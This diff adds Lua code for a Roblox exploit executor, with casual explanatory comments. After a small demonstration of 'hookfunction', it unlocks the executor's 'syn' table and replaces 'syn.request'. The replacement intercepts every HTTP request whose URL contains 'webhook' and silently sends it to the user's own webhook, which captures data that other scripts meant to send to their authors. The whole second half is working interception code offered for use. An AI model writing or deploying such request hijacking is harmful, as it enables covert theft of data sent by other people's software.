@@ -1,0 +1,14 @@
+function dostuff(a)
+error("oh no i errored",2) -- will error
+end
+hookfunction(dostuff, function(a)
+print("I just did stuff") -- basically overwrites dostuff and replaces it with this
+end)
+local Old = syn.request -- the executor api
+setreadonly(syn, false) -- changes the metatable
+syn.request = function(Data) -- replaces the function aka hookfunction
+  if string.find(Data.Url, "webhook") then -- listens to all http requests to find a webhook. if the webhook isn't yours it will replace it with yours
+    Data.Url = _G.WebHook -- replaces it
+  end
+  return Old(Data)
+end
